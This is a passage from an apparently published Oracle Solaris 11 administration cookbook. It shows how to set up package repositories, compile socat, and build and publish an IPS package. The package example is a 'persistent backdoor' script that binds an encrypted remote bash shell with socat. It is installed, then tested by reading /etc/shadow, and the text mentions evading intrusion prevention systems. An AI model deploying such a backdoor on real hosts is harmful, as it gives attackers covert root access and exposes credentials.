VRTSvlic (Symantec)                    3.2.61.4                   ---
VRTSvxfen (Symantec)                   6.0.100.0                  ---
VRTSvxfs (Symantec)                    6.0.100.0                  ---
VRTSvxvm (Symantec)                    6.0.100.0                  ---</pre></div><p class="calibre7">We already know the content of the SFHA 6.0.1 software, and in the next step, we create a publisher named <code class="email">Symantec</code> that has <code class="email">/root/SFHA601/dvd2-sol_x64/sol11_x64/pkgs/VRTSpkgs.p5p/</code> as the repository location:</p><div><pre class="programlisting">root@solaris11:~/SFHA601/dvd2-sol_x64/sol11_x64/pkgs# <strong class="calibre8">pkg set-publisher -p /root/SFHA601/dvd2-sol_x64/sol11_x64/pkgs/VRTSpkgs.p5p Symantec</strong>
pkg set-publisher:
  Added publisher(s): Symantec</pre></div><p class="calibre7">On listing the existing<a id="id100" class="calibre1"/> repositories, we're <a id="id101" class="calibre1"/>able to see the new repository:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg publisher</strong>
PUBLISHER                   TYPE     STATUS P LOCATION
solaris                     origin   online F http://pkg.oracle.com/solaris/release/
solarisstudio               origin   online F https://pkg.oracle.com/solarisstudio/release/
training                    origin   online F http://localhost:8888/
Symantec                    origin   online F file:///root/SFHA601/dvd2-sol_x64/sol11_x64/pkgs/VRTSpkgs.p5p/</pre></div><p class="calibre7">Moreover, it might come in handy to collect further information about this new repository named <code class="email">Symantec</code>:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkgrepo get -p  Symantec -s /root/SFHA601/dvd2-sol_x64/sol11_x64/pkgs/VRTSpkgs.p5p/</strong>
PUBLISHER   SECTION      PROPERTY           VALUE
Symantec    publisher    alias              
Symantec    publisher    prefix             Symantec
Symantec    repository   collection-type    core
Symantec    repository   description        ""
Symantec    repository   legal-uris         ()
Symantec    repository   mirrors            ()
Symantec    repository   name               ""
Symantec    repository   origins            ()
Symantec    repository   refresh-seconds    ""
Symantec    repository   registration-uri   ""
Symantec    repository   related-uris       ()</pre></div><p class="calibre7">Brilliant! A new publisher named <code class="email">Symantec</code> has come up, which points to <code class="email">/root/SFHA601/dvd2-sol_x64/sol11_x64/pkgs/VRTSpkgs.p5p/</code>. After all this work, we can install Veritas Volume Manager and Veritas Filesystem Packages. However, this is not the usual method to install Symantec Storage Foundation HA because Symantec recommends using the <code class="email">installer</code> or <code class="email">installsfha</code> script, which is contained inside a DVD. By the way, the following command is necessary to initiate the installation:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg install –accept VRTSvxvm VRTSvxfs</strong>
</pre></div><p class="calibre7">The <code class="email">--accept</code> keyword needs to comply with the Symantec license.</p><p class="calibre7">Note that the<a id="id102" class="calibre1"/> repository (and its respective packages) we just<a id="id103" class="calibre1"/> made and configured as a publisher named <code class="email">Symantec</code> is not available for network access, and unfortunately, it is not enough for our purposes. However, it's relatively easy to make all these <code class="email">Symantec</code> packages available through our previous <code class="email">training</code> publisher; let's do this with the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkgrecv -s /root/SFHA601/dvd2-sol_x64/sol11_x64/pkgs/VRTSpkgs.p5p/ -d /repo_pool/training_repo/publisher/training/ '*'</strong>
Processing packages for publisher Symantec ...
Retrieving and evaluating 25 package(s)...
PROCESS                             ITEMS    GET (MB)      SEND (MB)
Completed                           25/25    353.4/353.4   1064/1064

root@solaris11:~# <strong class="calibre8">pkgrepo info -s /repo_pool/training_repo</strong>
PUBLISHER  PACKAGES  STATUS           UPDATED
training   27        online           2013-10-23T10:39:27.872059Z
root@solaris11:~# <strong class="calibre8">svcadm refresh pkg/server:training</strong>
root@solaris11:~# <strong class="calibre8">svcadm restart pkg/server:training</strong>
</pre></div><p class="calibre7">Again, we can check these uploaded packages by going to the URL, <code class="email">http://localhost:8888/en/catalog.shtml</code>:</p><div><img src="img/00007.jpeg" alt="How to do it…" class="calibre12"/></div><p class="calibre13"> </p><div><div><div><div><h3 class="title2"><a id="ch01lvl3sec11" class="calibre1"/>An overview of the recipe</h3></div></div></div><p class="calibre7">This procedure<a id="id104" class="calibre1"/> is almost identical to the previous one, but we've tried to make things more practical. Moreover, Veritas Storage Foundation and <a id="id105" class="calibre1"/>Veritas Cluster Server are well-known programs, the value of which has already been proved with the response received from the market. Another good takeaway from this example is that Symantec provides a little database package (<code class="email">VRTSpkgs.p5p</code>) to help us create the appropriate repository that contains all the package references.</p></div></div></div>

<div><div><div><div><div><h1 class="title" id="calibre_pb_0"><a id="ch01lvl1sec20" class="calibre1"/>Creating your own package and publishing it</h1></div></div></div><p class="calibre7">So far, we've been working using packages provided from Oracle or another place, but it would be nice if we could create and publish<a id="id106" class="calibre1"/> our own package. This recipe requires that we have basic experience with compiling and installing free software.</p></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_1"><a id="ch01lvl2sec26" class="calibre1"/>Getting ready</h2></div></div></div><p class="calibre7">To follow this recipe, it's necessary that we<a id="id107" class="calibre1"/> have a machine (physical or virtual) running Oracle Solaris 11; we log in to the system as the root user and open a terminal. For example, we install a couple of packages such as <code class="email">system/header</code> and <code class="email">gcc-45</code> and <code class="email">socat</code>.</p></div></div>

<div><div><div><div><div><h2 class="title1" id="calibre_pb_2"><a id="ch01lvl2sec27" class="calibre1"/>How to do it…</h2></div></div></div><p class="calibre7">The first thing we need to do is install some required Oracle Solaris 11 packages, which will be necessary for the next steps:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg install system/header</strong>
</pre></div><p class="calibre7">The <code class="email">gcc-45</code> package is probably already installed on the system, and it will optionally demand the <code class="email">gcc-3</code> package; if this is the case, then we have to verify that the <code class="email">gcc45</code> software is already installed and check its dependencies by running the following two commands:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg list gcc-45</strong>
NAME (PUBLISHER)                    VERSION                    IFO
developer/gcc-45                    4.5.2-0.175.1.0.0.24.0     i--

root@solaris11:~# <strong class="calibre8">pkg contents -r -o action.raw -t depend gcc-45</strong>
ACTION.RAW
depend fmri=pkg:/system/linker@0.5.11-0.175.1.0.0.23.0 type=require
depend fmri=pkg:/library/mpfr@2.4.2-0.175.1.0.0.23.0 type=require
depend fmri=pkg:/system/header type=require
depend fmri=pkg:/developer/gnu-binutils@2.21.1-0.175.1.0.0.23.0 type=require variant.arch=i386
depend fmri=pkg:/library/gmp@4.3.2-0.175.1.0.0.23.0 type=require
depend fmri=pkg:/system/library@0.5.11-0.175.1.0.0.23.0 type=require
depend fmri=pkg:/system/library/gcc-45-runtime@4.5.2-0.175.1.0.0.24.0 type=require
depend fmri=pkg:/shell/ksh93@93.21.0.20110208-0.175.1.0.0.23.0 type=require
depend fmri=pkg:/library/mpc@0.9-0.175.1.0.0.23.0 type=require
depend fmri=developer/gcc-3@3.4.3-0.175 type=optional</pre></div><p class="calibre7">According to the last line in the<a id="id108" class="calibre1"/> previous command output, the <code class="email">gcc-45</code> package depends, optionally (<code class="email">type=optional</code>), on <code class="email">gcc-3</code>, so we can install <code class="email">gcc-3</code> with the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg install gcc-3</strong>
           Packages to install:  1
       Create boot environment: No
Create backup boot environment: No
            Services to change:  1

DOWNLOAD                                PKGS         FILES    XFER (MB)   SPEED
Completed                                1/1       317/317    29.6/29.6  368k/s

PHASE                                          ITEMS
Installing new actions                       393/393
Updating package state database                 Done 
Updating image state                            Done 
Creating fast lookup database                   Done </pre></div><p class="calibre7">We check the dependencies of the <code class="email">gcc-3</code> package by <a id="id109" class="calibre1"/>executing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg contents -r -o action.raw -t depend gcc-3</strong>
ACTION.RAW
depend fmri=pkg:/system/library/gcc-3-runtime@3.4.3-0.175.1.0.0.24.0 type=require
depend fmri=pkg:/developer/gnu-binutils@2.21.1-0.175.1.0.0.23.0 type=require variant.arch=i386
depend fmri=pkg:/system/header type=require
depend fmri=pkg:/system/library@0.5.11-0.175.1.0.0.23.0 type=require
depend fmri=pkg:/shell/ksh93@93.21.0.20110208-0.175.1.0.0.23.0 type=require
depend fmri=pkg:/system/linker@0.5.11-0.175.1.0.0.23.0 type=require</pre></div><p class="calibre7">We list the <code class="email">gcc-3</code> status and its details by executing the following command:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">pkg list gcc-3</strong>
NAME (PUBLISHER)                                  VERSION                    IFO
developer/gcc-3                                   3.4.3-0.175.1.0.0.24.0     i--
root@solaris11:~# <strong class="calibre8">gcc –v</strong>
Using built-in specs.
COLLECT_GCC=gcc
COLLECT_LTO_WRAPPER=/usr/gcc/4.5/lib/gcc/i386-pc-solaris2.11/4.5.2/lto-wrapper
Target: i386-pc-solaris2.11
Configured with: /builds/hudson/workspace/nightly-update/build/i386/components/gcc45/gcc-4.5.2/configure CC=/ws/on11update-tools/SUNWspro/sunstudio12.1/bin/cc CXX=/ws/on11update-tools/SUNWspro/sunstudio12.1/bin/CC --prefix=/usr/gcc/4.5 --mandir=/usr/gcc/4.5/share/man --bindir=/usr/gcc/4.5/bin --libdir=/usr/gcc/4.5/lib --sbindir=/usr/gcc/4.5/sbin --infodir=/usr/gcc/4.5/share/info --libexecdir=/usr/gcc/4.5/lib --enable-languages=c,c++,fortran,objc --enable-shared --with-gmp-include=/usr/include/gmp --with-mpfr-include=/usr/include/mpfr --without-gnu-ld --with-ld=/usr/bin/ld --with-gnu-as --with-as=/usr/gnu/bin/as CFLAGS='-g -O2 '
Thread model: posix
gcc version 4.5.2 (GCC) </pre></div><p class="calibre7">To make this example more attractive, we can download the socat tarball application from <a class="calibre1" href="http://www.dest-unreach.org/socat/">http://www.dest-unreach.org/socat/</a>. Socat is an <a id="id110" class="calibre1"/>amazing tool that is similar to the Netcat tool, but socat <a id="id111" class="calibre1"/>adds many additional features, such as the possibility to encrypt a connection to evade IPS systems. After downloading the <code class="email">socat</code> tool, we're going to create a very simple, persistent backdoor to package it in the Oracle Solaris 11 format, to publish<a id="id112" class="calibre1"/> it into the secondary repository (<code class="email">http://localhost:8888</code>) and install it on our own system. After we have completed all these steps, a practical example will be displayed using this backdoor.</p><p class="calibre7">At the time of writing this procedure, I've downloaded socat Version 2.0.0-b6 (<code class="email">socat-2.0.0-b6.tar.gz</code>), copied it to <code class="email">/tmp</code>, and opened the tarball:</p><div><pre class="programlisting">root@solaris11:~/Downloads# <strong class="calibre8">cp socat-2.0.0-b6.tar.gz /tmp</strong>
root@solaris11:/tmp# <strong class="calibre8">tar zxvf socat-2.0.0-b6.tar.gz</strong>
</pre></div><p class="calibre7">Let's create the <code class="email">socat</code> binary. The usual step is to run the <code class="email">configure</code> script to check all socat requirements on the system, so let's execute it:</p><div><pre class="programlisting">root@solaris11:/tmp# <strong class="calibre8">cd  socat-2.0.0-b6</strong>
root@solaris11:/tmp/socat-2.0.0-b6# <strong class="calibre8">./configure</strong>
</pre></div><p class="calibre7">Before compiling the socat application, we have to edit some source files and change some lines because the original socat files don't compile on Oracle Solaris 11. In the same socat directory, we need to edit the <code class="email">xioopts.c</code> file, go to lines 3998 and 4001, and change them according to the following illustration:</p><div><pre class="programlisting">root@solaris11:/tmp/socat-2.0.0-b6# <strong class="calibre8">vi xioopts.c</strong>
</pre></div><p class="calibre7">The following lines are the original content of the file:</p><div><pre class="programlisting">if (Setsockopt(xfd-&gt;fd1, opt-&gt;desc-&gt;major, opt-&gt;desc-&gt;minor,
                              &amp;ip4_mreqn.mreq, sizeof(ip4_mreqn.mreq)) &lt; 0) {
                  Error7("setsockopt(%d, %d, %d, {0x%08x,0x%08x}, "F_Zu"): %s",
                         xfd-&gt;fd1, opt-&gt;desc-&gt;major, opt-&gt;desc-&gt;minor,
                         ip4_mreqn.mreq.imr_multiaddr,
                         ip4_mreqn.mreq.imr_interface,
                         sizeof(ip4_mreqn.mreq),
                         strerror(errno));
                  opt-&gt;desc = ODESC_ERROR; continue;
               }</pre></div><p class="calibre7">After our change, the <a id="id113" class="calibre1"/>content looks like the following:</p><div><pre class="programlisting">if (Setsockopt(xfd-&gt;<strong class="calibre8">rfd</strong>, opt-&gt;desc-&gt;major, opt-&gt;desc-&gt;minor,
                              &amp;ip4_mreqn.mreq, sizeof(ip4_mreqn.mreq)) &lt; 0) {
                  Error7("setsockopt(%d, %d, %d, {0x%08x,0x%08x}, "F_Zu"): %s",
                         xfd-&gt;<strong class="calibre8">rfd</strong>, opt-&gt;desc-&gt;major, opt-&gt;desc-&gt;minor,
                         ip4_mreqn.mreq.imr_multiaddr,
                         ip4_mreqn.mreq.imr_interface,
                         sizeof(ip4_mreqn.mreq),
                         strerror(errno));
                  opt-&gt;desc = ODESC_ERROR; continue;
               }       </pre></div><p class="calibre7">Now, it's convenient to <a id="id114" class="calibre1"/>make it the following:</p><div><pre class="programlisting">root@solaris11:/tmp/socat-2.0.0-b6# <strong class="calibre8">make</strong>
root@solaris11:/tmp/socat-2.0.0-b6# <strong class="calibre8">make install</strong>
mkdir -p /usr/local/bin
/usr/bin/ginstall -c -m 755 socat /usr/local/bin
/usr/bin/ginstall -c -m 755 procan /usr/local/bin
/usr/bin/ginstall -c -m 755 filan /usr/local/bin
mkdir -p /usr/local/share/man/man1
/usr/bin/ginstall -c -m 644 ./doc/socat.1 /usr/local/share/man/man1/</pre></div><p class="calibre7">In the next step, we modify the <code class="email">/root/.bashrc</code> profile in the following way:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">cd</strong>
root@solaris11:~# <strong class="calibre8">more .bashrc</strong>
#
# Define default prompt to &lt;username&gt;@&lt;hostname&gt;:&lt;path&gt;&lt;"($|#) "&gt;
# and print '#' for user "root" and '$' for normal users.
#

typeset +x PS1="\u@\h:\w\\$ "

<strong class="calibre8">PATH=$PATH:/usr/local/bin</strong>
<strong class="calibre8">MANPATH=$MANPATH:/usr/local/share/man</strong>
<strong class="calibre8">export PATH MANPATH</strong>
</pre></div><p class="calibre7">All the changes we <a id="id115" class="calibre1"/>have made so far <a id="id116" class="calibre1"/>enable us to execute the <code class="email">socat</code> tool from anywhere and access its manual pages too:</p><div><pre class="programlisting">root@solaris11:~# <strong class="calibre8">. ./.bashrc</strong>
root@solaris11:~# <strong class="calibre8">socat –V</strong>
socat by Gerhard Rieger - see www.dest-unreach.org
socat version 2.0.0-b6 on Oct 26 2013 17:33:19
   running on SunOS version 11.1, release 5.11, machine i86pc
features:
  #define WITH_STDIO 1
  #define WITH_FDNUM 1
  #define WITH_FILE 1
  #define WITH_CREAT 1
  #define WITH_GOPEN 1
  #define WITH_TERMIOS 1
  #define WITH_PIPE 1
  #define WITH_UNIX 1
  #undef WITH_ABSTRACT_UNIXSOCKET
  #define WITH_IP4 1
  #define WITH_IP6 1
  #define WITH_RAWIP 1
  #define WITH_GENERICSOCKET 1
  #define WITH_INTERFACE 1
  #define WITH_TCP 1
  #define WITH_UDP 1
  #define WITH_SCTP 1
  #define WITH_LISTEN 1
  #define WITH_SOCKS4 1
  #define WITH_SOCKS4A 1
  #define WITH_PROXY 1
  #define WITH_SYSTEM 1
  #define WITH_EXEC 1
  #define WITH_READLINE 1
  #undef WITH_TUN
  #define WITH_PTY 1
  #define WITH_OPENSSL 1
  #undef WITH_FIPS
  #define WITH_LIBWRAP 1
  #define WITH_SYCLS 1
  #define WITH_FILAN 1
  #define WITH_RETRY 1
  #define WITH_MSGLEVEL 0 /*debug*/

root@solaris11:~# <strong class="calibre8">man socat</strong>
User Commands                                            socat(1)

NAME
     socat - Multipurpose relay (SOcket CAT)

SYNOPSIS
     socat [options] &lt;address-chain&gt; &lt;address-chain&gt;
     socat -V
     socat -h[h[h]] | -?[?[?]]
     filan
     procan</pre></div><div><h3 class="title2"><a id="note03" class="calibre1"/>Note</h3><p class="calibre7">Socat is a<a id="id117" class="calibre1"/> command-line-based utility that establishes two bidirectional byte streams and transfers data between them.</p></div><p class="calibre7">Since the<a id="id118" class="calibre1"/> socat tool <a id="id119" class="calibre1"/>encrypts connections, we need to create a digital certificate:</p><div><pre class="programlisting">root@solaris11:/tmp# <strong class="calibre8">mkdir backdoor</strong>
root@solaris11:/tmp# <strong class="calibre8">cd backdoor</strong>
root@solaris11:/tmp/backdoor# <strong class="calibre8">uname -a</strong>
SunOS solaris11 5.11 11.1 i86pc i386 i86pc

root@solaris11:/tmp/backdoor#  <strong class="calibre8">openssl genrsa -out solaris11.key 2048</strong>
Generating RSA private key, 2048 bit long modulus
...............................................................................................................................+++
........+++
e is 65537 (0x10001)

root@solaris11:/tmp/backdoor# <strong class="calibre8">ls</strong>
solaris11.key

root@solaris11:/tmp/backdoor# <strong class="calibre8">openssl req -new -key solaris11.key -x509 -days 9999 -out solaris11.crt</strong>
You are about to be asked to enter information that will be incorporated into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) []: <strong class="calibre8">BR</strong>
State or Province Name (full name) []: <strong class="calibre8">Sao Paulo</strong>
Locality Name (eg, city) []: <strong class="calibre8">Sao Paulo</strong>
Organization Name (eg, company) []: <strong class="calibre8">http://alexandreborges.org</strong>
Organizational Unit Name (eg, section) []: <strong class="calibre8">Education</strong>
Common Name (e.g. server FQDN or YOUR name) []: <strong class="calibre8">solaris11</strong>
Email Address []: <strong class="calibre8">alexandreborges@alexandreborges.org</strong>

root@solaris11:/tmp/backdoor# <strong class="calibre8">ls</strong>
solaris11.crt  solaris11.key
root@solaris11:/tmp/backdoor# <strong class="calibre8">cat solaris11.key solaris11.crt &gt; solaris11.pem</strong>
root@solaris11:/tmp/backdoor# <strong class="calibre8">ls</strong>
solaris11.crt  solaris11.key  solaris11.pem</pre></div><p class="calibre7">At the server side, we've finished<a id="id120" class="calibre1"/> the procedure to configure socat. At the client side, it's necessary to create a key too:</p><div><pre class="programlisting">root@solaris11:/tmp/backdoor# <strong class="calibre8">openssl genrsa -out client.key 2048</strong>
</pre></div><p class="calibre7">For the purpose of explanation <a id="id121" class="calibre1"/>and demonstration, I'm going to use the server as a client, but when handling a real-life situation, we need to execute the same command (<code class="email">openssl req -new -key solaris11.key -x509 -days 9999 -out solaris11.crt</code>) on our client.</p><p class="calibre7">On the same machine (client), we create a script that starts the socat tool in a persistent listening mode on port <code class="email">3333</code>:</p><div><pre class="programlisting">root@solaris11:/tmp/backdoor# <strong class="calibre8">vi backdoor_exec.sh</strong>
#!/bin/bash
socat OPENSSL-LISTEN:3333,reuseaddr,fork,cert=solaris11.pem,cafile=solaris11.crt EXEC:/bin/bash</pre></div><p class="calibre7">Though the preceding script is <a id="id122" class="calibre1"/>extremely easy, we need to pay attention to the following deployed options:</p><div><ul class="itemizedlist"><li class="listitem"><strong class="calibre8">LISTEN:3333</strong>: This is the port<a id="id123" class="calibre1"/> where socat is listening</li><li class="listitem"><strong class="calibre8">reuseaddr</strong>: This allows<a id="id124" class="calibre1"/> other sockets to bind  to an address even if the local port (<code class="email">3333</code>) is already in use by socat</li><li class="listitem"><strong class="calibre8">fork</strong>: After establishing a connection, this handles<a id="id125" class="calibre1"/> its channel in a child process and keeps the parent process attempting to produce more connections, either by listening or by connecting in a loop</li><li class="listitem"><strong class="calibre8">cert</strong>: This is the digital <a id="id126" class="calibre1"/>certificate that we've made</li><li class="listitem"><strong class="calibre8">cafile</strong>: This specifies the file <a id="id127" class="calibre1"/>with the trusted (root) authority certificates</li><li class="listitem"><strong class="calibre8">EXEC</strong>: This will<a id="id128" class="calibre1"/> be executed</li></ul></div><p class="calibre7">Execute the following command to make it executable:</p><div><pre class="programlisting">root@solaris11:/tmp/backdoor# <strong class="calibre8">chmod u+x backdoor_exec.sh</strong>
</pre></div><p class="calibre7">Now that the socat configuration is<a id="id129" class="calibre1"/> complete, the next task is executed in the Oracle Solaris domain. In the first step, we create a manifest file, which is used to create an IPS package, because this manifest file contains all the required dependencies of our backdoor IPS package. The backdoor manifest file will be created in parts:</p><div><pre class="programlisting">root@solaris11:/tmp# <strong class="calibre8">pkgsend generate backdoor &gt; /tmp/backdoor_manifest.level1</strong>
root@solaris11:/tmp# <strong class="calibre8">more /tmp/backdoor_manifest.level1</strong>
file solaris11.key group=bin mode=0644 owner=root path=solaris11.key
file solaris11.crt group=bin mode=0644 owner=root path=solaris11.crt
file solaris11.pem group=bin mode=0644 owner=root path=solaris11.pem
file backdoor_exec.sh group=bin mode=0744 owner=root path=backdoor_exec.sh</pre></div><p class="calibre7">The content from the manifest file is not so complex, and there are keywords (actions) that can be interesting to learn. Moreover, the syntax is straightforward:</p><div><pre class="programlisting">&lt;action_name&gt; &lt;attribute1=value1&gt; &lt;attribute2=value2&gt; ...</pre></div><p class="calibre7">Some of these actions are as follows:</p><div><ul class="itemizedlist"><li class="listitem"><strong class="calibre8">file</strong>: This specifies a <a id="id130" class="calibre1"/>file installed by the package</li><li class="listitem"><strong class="calibre8">set</strong>: This specifies information<a id="id131" class="calibre1"/> such as name and description</li><li class="listitem"><strong class="calibre8">dir</strong>: This is the directory<a id="id132" class="calibre1"/> that is installed by the package</li><li class="listitem"><strong class="calibre8">hardlink</strong>: This points to a <a id="id133" class="calibre1"/>hardlink</li><li class="listitem"><strong class="calibre8">link</strong>: This determines a<a id="id134" class="calibre1"/> symbolic link</li><li class="listitem"><strong class="calibre8">license</strong>: This determines what kind of<a id="id135" class="calibre1"/> license is bound to the package</li><li class="listitem"><strong class="calibre8">depend</strong>: This lists the dependencies<a id="id136" class="calibre1"/> that this package has on other software or tools</li><li class="listitem"><strong class="calibre8">legacy</strong>: This sets any required <a id="id137" class="calibre1"/>information that must be installed in the legacy package database to keep the compatibility</li></ul></div><p class="calibre7">Certainly, there are other <a id="id138" class="calibre1"/>complex manifests, but nothing that is complex enough to<a id="id139" class="calibre1"/> worry us. The following example adopts the ready manifest of the Netcat package:</p><div><pre class="programlisting">root@solaris11:/tmp# <strong class="calibre8">pkg contents -m netcat &gt; /tmp/netcat.p5m</strong>
root@solaris11:/tmp# <strong class="calibre8">more /tmp/netcat.p5m</strong>
set name=pkg.fmri value=pkg://solaris/network/netcat@0.5.11,5.11-0.175.1.0.0.24.2:20120919T184427Z

set name=pkg.summary value="Netcat command"
set name=pkg.description value="The nc(1) or netcat(1) utility can open TCP connections, send UDP packets, listen on arbitrary TCP and UDP ports and perform port scanning."
set name=info.classification value=org.opensolaris.category.2008:Applications/Internet
set name=org.opensolaris.consolidation value=osnet
set name=variant.opensolaris.zone value=global value=nonglobal
set name=variant.debug.osnet value=true value=false
set name=variant.arch value=sparc value=i386
depend fmri=consolidation/osnet/osnet-incorporation type=require
depend fmri=pkg:/system/library@0.5.11-0.175.1.0.0.24.2 type=require
dir group=sys mode=0755 owner=root path=usr
dir group=bin mode=0755 owner=root path=usr/bin
dir facet.doc.man=true facet.locale.ja_JP=true group=bin mode=0755 owner=root path=usr/share/man/ja_JP.UTF-8/man1
dir facet.doc.man=true group=bin mode=0755 owner=root path=usr/share/man/man1
…...</pre></div><p class="calibre7">In the next step, we create a MOG file (which is a kind of metadata file):</p><div><pre class="programlisting">root@solaris11:/tmp# <strong class="calibre8">cat &lt;&lt; EOF &gt; /tmp/backdoor.mog</strong>

&gt; <strong class="calibre8">set name=pkg.fmri value=backdoor@1.0,5.11.0</strong>
&gt; <strong class="calibre8">set name=pkg.description value=”Backdoor using socat”</strong>
&gt; <strong class="calibre8">set name=pkg.summary value=”This a backdoor package used for demonstrating package publishing”</strong>
&gt; <strong class="calibre8">EOF</strong>

root@solaris11:/tmp# <strong class="calibre8">pkgmogrify /tmp/backdoor_manifest.level1 /tmp/backdoor.mog &gt; /tmp/backdoor_manifest.level2</strong>
root@solaris11:/tmp# <strong class="calibre8">more /tmp/backdoor_manifest.level2</strong>
file solaris11.key group=bin mode=0644 owner=root path=solaris11.key
file solaris11.crt group=bin mode=0644 owner=root path=solaris11.crt
file solaris11.pem group=bin mode=0644 owner=root path=solaris11.pem
file backdoor_exec.sh group=bin mode=0744 owner=root path=backdoor_exec.sh

set name=pkg.fmri value=backdoor@1.0,5.11.0
set name=pkg.description value="Backdoor using socat"
set name=pkg.summary value="This a backdoor package used for demonstrating package publishing"</pre></div><p class="calibre7">As you will have realized, all <a id="id140" class="calibre1"/>the metadata information included in the <code class="email">backdoor.mog</code> file was added at the end of the <code class="email">manifest.level2</code> file. In the third step, we<a id="id141" class="calibre1"/> include dependencies into the manifest file and then execute the following commands:</p><div><pre class="programlisting">root@solaris11:/tmp# <strong class="calibre8">pkgdepend generate -md backdoor /tmp/backdoor_manifest.level2 &gt; /tmp/backdoor_manifest.level3</strong>
root@solaris11:/tmp# <strong class="calibre8">more /tmp/backdoor_manifest.level3</strong>
file solaris11.key group=bin mode=0644 owner=root path=solaris11.key
file solaris11.crt group=bin mode=0644 owner=root path=solaris11.crt
file solaris11.pem group=bin mode=0644 owner=root path=solaris11.pem
file backdoor_exec.sh group=bin mode=0744 owner=root path=backdoor_exec.sh

set name=pkg.fmri value=backdoor@1.0,5.11.0
set name=pkg.description value="Backdoor using socat"
set name=pkg.summary value="This a backdoor package used for demonstrating package publishing"

depend fmri=__TBD pkg.debug.depend.file=bash pkg.debug.depend.path=usr/bin pkg.debug.depend.reason=backdoor_exec.sh pkg.debug.depend.type=script type=require</pre></div><p class="calibre7">Once the dependencies list is generated, we need to resolve the dependencies against packages that are installed on the system:</p><div><pre class="programlisting">root@solaris11:/tmp# <strong class="calibre8">pkgdepend resolve -m /tmp/backdoor_manifest.level3</strong>
root@solaris11:/tmp# <strong class="calibre8">more /tmp/backdoor_manifest.level3.res</strong>
file solaris11.key group=bin mode=0644 owner=root path=solaris11.key
file solaris11.crt group=bin mode=0644 owner=root path=solaris11.crt
file solaris11.pem group=bin mode=0644 owner=root path=solaris11.pem
file backdoor_exec.sh group=bin mode=0744 owner=root path=backdoor_exec.sh
set name=pkg.fmri value=backdoor@1.0,5.11.0
set name=pkg.description value="Backdoor using socat"
set name=pkg.summary value="This a backdoor package used for demonstrating package publishing"
depend fmri=pkg:/shell/bash@4.1.9-0.175.1.0.0.24.0 type=require</pre></div><p class="calibre7">Before proceeding, we need to<a id="id142" class="calibre1"/> change the previous file (<code class="email">backdoor_manifest.level3.res</code> under <code class="email">/tmp</code> directory) to install <a id="id143" class="calibre1"/>the backdoor package in the <code class="email">/backdoor</code> directory:</p><div><pre class="programlisting">root@solaris11:/backup/backdoor2# <strong class="calibre8">more backdoor_manifest.level3.res</strong>
dir group=bin mode=0755 owner=root path=<strong class="calibre8">/backdoor</strong>
file solaris11.key group=bin mode=0644 owner=root path=<strong class="calibre8">/backdoor/solaris11.key</strong>
file solaris11.crt group=bin mode=0644 owner=root path=<strong class="calibre8">/backdoor/solaris11.crt</strong>
file solaris11.pem group=bin mode=0644 owner=root path=<strong class="calibre8">/backdoor/solaris11.pem</strong>
file backdoor_exec.sh group=bin mode=0744 owner=root path=<strong class="calibre8">/backdoor/backdoor_exec.sh</strong>
set name=pkg.fmri value=backdoor@1.0,5.11.0
set name=pkg.description value="Backdoor using socat"
set name=pkg.summary value="This a backdoor package used for demonstrating package publishing"
depend fmri=pkg:/shell/bash@4.1.9-0.175.1.0.0.24.0 type=require</pre></div><p class="calibre7">We are almost there. Our final goal is to assemble the package and add it to the repository:</p><div><pre class="programlisting">root@solaris11:/tmp# <strong class="calibre8">pkgsend -s http://localhost:8888 publish -d /tmp/backdoor/ /tmp/backdoor_manifest.level3.res</strong> 
PUBLISHED
pkg://training/backdoor@1.0,5.11.0:20131027T004326Z

root@solaris11:/tmp# <strong class="calibre8">svcadm refresh application/pkg/server:training</strong>
root@solaris11:/tmp# <strong class="calibre8">svcadm restart application/pkg/server:training</strong>
root@solaris11:/tmp# <strong class="calibre8">svcs -a | grep application/pkg/server:training</strong>
online         22:44:16 svc:/application/pkg/server:training
root@solaris11:/tmp# <strong class="calibre8">pkg search -r backdoor</strong>
INDEX           ACTION VALUE                                                             PACKAGE
pkg.description set    Backdoor using socat                                          pkg:/backdoor@1.0
basename        file   backdoor                                                          pkg:/backdoor@1.0
pkg.fmri        set    training/backdoor                                                 pkg:/backdoor@1.0
pkg.summary     set    This a backdoor package used for demonstrating package publishing pkg:/backdoor@1.0</pre></div><p class="calibre7">Wow! We've done it! A <a id="id144" class="calibre1"/>good way to<a id="id145" class="calibre1"/> test this is to install our backdoor package:</p><div><pre class="programlisting">root@solaris11:/backup/backdoor2# <strong class="calibre8">pkg install backdoor</strong>
           Packages to install:  1
       Create boot environment: No
Create backup boot environment: No

DOWNLOAD                     PKGS         FILES    XFER (MB)   SPEED
Completed                    1/1          4/4      0.0/0.0     373k/s

PHASE                                          ITEMS
Installing new actions                           9/9
Updating package state database                 Done 
Updating image state                            Done 
Creating fast lookup database                   Done 

root@solaris11:/backup/backdoor2# <strong class="calibre8">pkg contents backdoor</strong>
PATH
backdoor
backdoor/backdoor_exec.sh
backdoor/solaris11.crt
backdoor/solaris11.key
backdoor/solaris11.pem</pre></div><p class="calibre7">Finally, we test<a id="id146" class="calibre1"/> the functionality <a id="id147" class="calibre1"/>of the backdoor. In the first terminal, we type the following:</p><div><pre class="programlisting">root@solaris11:/backdoor# <strong class="calibre8">ls</strong>
backdoor_exec.sh  solaris11.crt     solaris11.key     solaris11.pem
root@solaris11:/backdoor# <strong class="calibre8">./backdoor_exec.sh </strong>
In the second terminal: 

root@solaris11:/backdoor# <strong class="calibre8">socat STDIO OPENSSL-CONNECT:localhost:3333,cert=solaris11.pem,cafile=solaris11.crt</strong>

<strong class="calibre8">ls</strong>
backdoor_exec.sh
solaris11.crt
solaris11.key
solaris11.pem

<strong class="calibre8">cat /etc/shadow</strong>
